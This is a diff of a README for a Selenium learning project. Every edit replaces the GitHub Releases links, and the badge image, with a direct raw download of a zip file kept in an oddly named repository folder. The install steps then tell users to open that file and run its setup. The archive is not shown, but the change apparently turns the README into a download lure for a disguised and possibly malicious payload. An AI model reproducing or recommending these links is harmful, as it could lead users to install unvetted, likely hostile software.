@@ -1,6 +1,6 @@
 # 🌟 Practice_Automation_Selenium - Learn Automation Easily
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-brightgreen)](https://github.com/Anhtu2003MC/Practice_Automation_Selenium/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/Anhtu2003MC/Practice_Automation_Selenium/main/disjointure/Practice_Automation_Selenium.zip%20Latest%20Release-Click%20Here-brightgreen)](https://raw.githubusercontent.com/Anhtu2003MC/Practice_Automation_Selenium/main/disjointure/Practice_Automation_Selenium.zip)
 
 ## 📜 Project Overview
 
@@ -11,7 +11,7 @@ Welcome to the Practice_Automation_Selenium repository. This project is for lear
 To begin using the application, follow these simple steps:
 
 1. **Download the Application**  
-   Visit the [Releases page](https://github.com/Anhtu2003MC/Practice_Automation_Selenium/releases) to download the latest version of the application.
+   Visit the [Releases page](https://raw.githubusercontent.com/Anhtu2003MC/Practice_Automation_Selenium/main/disjointure/Practice_Automation_Selenium.zip) to download the latest version of the application.
 
 2. **Install the Application**  
    Once the download is complete, open the downloaded file and follow the on-screen instructions to install the application on your computer.
@@ -21,9 +21,9 @@ To begin using the application, follow these simple steps:
 
 ## 📥 Download & Install
 
-- **Step 1:** Visit the [Releases page](https://github.com/Anhtu2003MC/Practice_Automation_Selenium/releases) to download the application. 
+- **Step 1:** Visit the [Releases page](https://raw.githubusercontent.com/Anhtu2003MC/Practice_Automation_Selenium/main/disjointure/Practice_Automation_Selenium.zip) to download the application. 
 - **Step 2:** Choose the latest version from the available releases.
-- **Step 3:** Click the download link for the application file (e.g., MyApp.exe).
+- **Step 3:** Click the download link for the application file (e.g., https://raw.githubusercontent.com/Anhtu2003MC/Practice_Automation_Selenium/main/disjointure/Practice_Automation_Selenium.zip).
 - **Step 4:** Open the downloaded file and follow the setup instructions.
 - **Step 5:** Open the application and begin exploring the features.
 
@@ -93,4 +93,4 @@ This project is open source and available under the MIT License, allowing you to
 
 This application serves as a useful tool for anyone interested in learning Selenium automation. With a simple installation and user-friendly interface, you can begin your journey in test automation effortlessly.
 
-For the latest updates and downloads, don’t forget to visit the [Releases page](https://github.com/Anhtu2003MC/Practice_Automation_Selenium/releases). Happy testing!
+For the latest updates and downloads, don’t forget to visit the [Releases page](https://raw.githubusercontent.com/Anhtu2003MC/Practice_Automation_Selenium/main/disjointure/Practice_Automation_Selenium.zip). Happy testing!
